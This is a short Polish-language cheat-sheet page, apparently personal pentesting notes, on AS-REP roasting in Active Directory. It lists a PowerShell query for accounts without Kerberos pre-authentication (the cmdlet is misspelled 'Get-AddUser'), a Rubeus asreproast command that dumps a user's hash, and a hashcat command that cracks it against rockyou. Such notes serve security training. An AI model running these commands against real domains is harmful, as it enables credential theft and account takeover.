---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Rubeus

**Win**

{% code overflow="wrap" %}
```python
Get-AddUser -Filter * -Properties DoesNotRequirePreAuth | ? {$_.DoesNotRequirePreAuth -eq "True"}
```
{% endcode %}

uruchamiamy Rubeusa

```
.\Rubeus.exe asreproast /user:minniem /format:hashcat /outfile:asrep.hash
```

**Kali**

zapisujemy hash do pliku asrep\_hash

crackujemy w hashcat po sparwdzeniu typu hasha

```
hashcat -m 18200 asrep_hash /usr/share/wordlists/rockyou.txt
```

